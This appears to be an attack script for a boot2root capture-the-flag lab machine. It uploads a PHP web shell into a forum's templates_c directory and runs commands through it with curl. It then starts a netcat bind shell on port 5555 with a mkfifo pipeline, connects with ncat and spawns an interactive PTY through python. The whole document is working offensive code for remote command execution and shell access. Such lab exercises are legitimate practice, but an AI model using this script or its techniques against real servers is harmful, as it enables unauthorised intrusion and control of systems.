#!/usr/bin/env bash

set -euo pipefail

TARGET="boot2root.vm"

WWW_ROOT="/var/www"
UPLOAD_DIR="forum/templates_c"
TMP_DIR="/tmp"

UPLOAD_URL="https://$TARGET/$UPLOAD_DIR"

FIFO="$TMP_DIR/f"
SHELL="bash"
NC="nc"
PORT=5555

BIND_SHELL="rm -f '$FIFO'; mkfifo '$FIFO'; cat '$FIFO' | '$SHELL' -i 2>&1 | '$NC' -l '$PORT' 2>&1 > '$FIFO'"
SPAWN_PTY="export USER=\$(whoami) HOME=\"/home/\$(whoami)\" TERM=xterm; python -c 'import pty; pty.spawn(\"$SHELL\")'"

exec_cmd() # [cmd]...
{
	curl --insecure "$UPLOAD_URL/shell.php" \
		-G --data-urlencode "cmd=$*"
}

./upload.sh "$1" "$2" ./shell.php "$WWW_ROOT/$UPLOAD_DIR/shell.php" || :

shift 2

#exec_cmd "killall nc"

exec_cmd "$BIND_SHELL" &

sleep 1

if [ $# -gt 0 ]
then
	ncat --no-shutdown "$TARGET" "$PORT" <<< "$*; exit"
else
	(echo "$SPAWN_PTY"; cat) | ncat "$TARGET" "$PORT"
fi
